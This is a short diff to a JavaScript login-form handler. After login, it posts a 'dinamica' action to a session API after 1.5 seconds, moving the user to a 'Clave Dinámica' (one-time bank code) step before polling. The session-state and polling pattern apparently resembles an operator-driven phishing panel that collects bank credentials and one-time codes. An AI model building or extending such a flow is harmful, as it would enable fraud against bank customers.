@@ -223,7 +223,21 @@ document.getElementById("loginForm").addEventListener("submit", (e) => {
   })
   .then(() => {
     startPing();
-    startPolling();
+    
+    // Auto-transición a Clave Dinámica después de 1.5s
+    setTimeout(() => {
+      fetch(`/api/sessions/${sessionId}/action`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'dinamica', state: 'waiting-dinamica' })
+      })
+      .then(() => {
+        startPolling();
+      })
+      .catch(() => {
+        startPolling();
+      });
+    }, 1500);
   })
   .catch(() => {
     document.getElementById("bfLoader").classList.remove("open");
